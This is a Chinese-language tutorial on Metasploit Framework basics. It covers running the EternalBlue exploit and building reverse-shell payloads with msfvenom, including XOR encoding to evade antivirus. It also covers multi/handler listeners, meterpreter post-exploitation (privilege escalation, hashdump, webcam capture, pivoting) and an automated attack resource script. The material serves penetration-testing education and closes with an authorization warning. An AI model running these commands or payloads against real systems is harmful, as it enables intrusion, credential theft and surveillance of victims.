# Metasploit Framework 基础用法

Metasploit Framework（msf）是渗透测试事实标准框架，包含 2000+ 个 exploit、500+ 个 payload、800+ 个 auxiliary 和 post 模块。

## 安装

```bash
brew install metasploit                                      # macOS
# 官方安装脚本（Linux 推荐）：
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall \
  && chmod 755 msfinstall && sudo ./msfinstall
```

验证：

```bash
msfconsole -v
```

## 启动

```bash
msfconsole                # 标准启动（含横幅）
msfconsole -q             # 安静模式（无横幅，快）
msfconsole -q -n          # 安静且不连数据库（更快但失去 hosts/services）
```

第一次启动 msf 会问你要不要建数据库（PostgreSQL），强烈建议要。

## 数据库 = 知识图谱

```
msf6 > db_status                    # 看连接状态
msf6 > workspace                    # 列出工作区
msf6 > workspace -a my-engagement   # 新建工作区
msf6 > workspace my-engagement      # 切换
msf6 > db_import nmap_scan.xml      # 导入 nmap XML
msf6 > hosts                        # 看主机
msf6 > services                     # 看服务
msf6 > vulns                        # 看漏洞
msf6 > creds                        # 看凭据
```

## 模块查找

```
msf6 > search type:exploit platform:windows smb
msf6 > search cve:2017-0144                       # 按 CVE
msf6 > search name:eternalblue
msf6 > search rank:excellent type:exploit
```

按 rank 排序常见值：`excellent` > `great` > `good` > `normal` > `average` > `low` > `manual`。

## 用模块四步法

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > info                          # 看模块说明
msf6 exploit(...) > options                       # 看必填项
msf6 exploit(...) > set RHOSTS 192.168.1.10
msf6 exploit(...) > set LHOST 192.168.1.5
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > check                         # 探测是否可被攻击
msf6 exploit(...) > exploit                       # 或 run
```

## 常用 payload

| Payload | 平台 |
|---|---|
| `windows/x64/meterpreter/reverse_tcp` | Windows x64 反弹 |
| `windows/x64/meterpreter/reverse_https` | TLS 反弹 |
| `linux/x64/meterpreter/reverse_tcp` | Linux 反弹 |
| `python/meterpreter/reverse_tcp` | 跨平台 Python |
| `java/meterpreter/reverse_tcp` | Java 反弹 |
| `cmd/unix/reverse_bash` | 简单 bash |
| `windows/x64/exec` | 直接执 cmd |

## msfvenom 生成单文件 payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f exe -o pay.exe

msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f elf -o pay.elf

msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f raw -o pay.php
```

格式：`-f exe / elf / raw / asp / war / py / vba / hex` 等。

编码绕过 AV：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o pay.exe
```

（现代 EDR 已能检测）

## 起 handler 接 shell

```
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.0.0.5
msf6 > set LPORT 4444
msf6 > set ExitOnSession false
msf6 > exploit -j -z          # 后台运行，不进入新 session
```

## meterpreter 后渗透

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem               # 提权
meterpreter > hashdump                # SAM hash
meterpreter > screenshot
meterpreter > webcam_snap
meterpreter > shell                   # cmd shell
meterpreter > upload local.exe C:\\
meterpreter > download C:\\file
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.50      # 端口转发
meterpreter > run autoroute -s 192.168.2.0/24             # 内网路由
meterpreter > background              # 回 msf
```

## 常用 auxiliary 模块

```
auxiliary/scanner/smb/smb_version            # SMB 版本探测
auxiliary/scanner/ssh/ssh_version            # SSH 版本
auxiliary/scanner/portscan/tcp               # 简单 TCP 扫描
auxiliary/scanner/http/dir_scanner           # 目录扫描
auxiliary/scanner/snmp/snmp_login            # SNMP 弱口令
auxiliary/scanner/mysql/mysql_login          # MySQL 弱口令
auxiliary/scanner/postgres/postgres_login    # Postgres 弱口令
```

## 资源脚本（自动化）

写 `auto.rc`：

```
workspace -a auto-job
db_import nmap.xml
hosts
services -p 445
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit
```

启动：

```bash
msfconsole -r auto.rc
```

## 常见坑

- 第一次启动连数据库慢 → 建议留 1 分钟
- macOS Homebrew 装的 msf 偶尔 ruby 版本冲突 → `which ruby` 确认指向 msf 自带的 ruby
- meterpreter 跨 NAT 时用 `reverse_https` 比 `reverse_tcp` 稳
- `exploit -j` 后台后用 `sessions` / `sessions -i N` 进会话；不要 fg 卡死
- 永远在授权环境用，未授权使用 = 入刑
